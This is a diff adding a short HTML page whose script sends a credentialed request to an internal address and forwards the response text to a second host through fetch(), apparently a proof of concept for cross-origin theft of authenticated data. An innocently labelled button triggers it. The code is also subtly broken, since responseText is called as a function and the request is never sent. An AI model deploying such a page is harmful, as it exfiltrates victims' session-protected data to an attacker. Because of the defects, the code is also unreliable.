@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+function boom(){
+var xmlhttp;
+xmlhttp=new XMLHttpRequest();
+xmlhttp.open("GET","http://172.16.1.65/");
+xmlhttp.withCredentials = true;
+//var str=xmlhttp.getAllResponseHeaders();
+var str1 = xmlhttp.responseText();
+fetch("http://172.16.1.60/"+str1);
+}
+</script>
+</head>
+<body>
+
+<button onclick=boom()>Send an HTTP GET request to a page and get the result back</button>
+
+</body>
+</html>
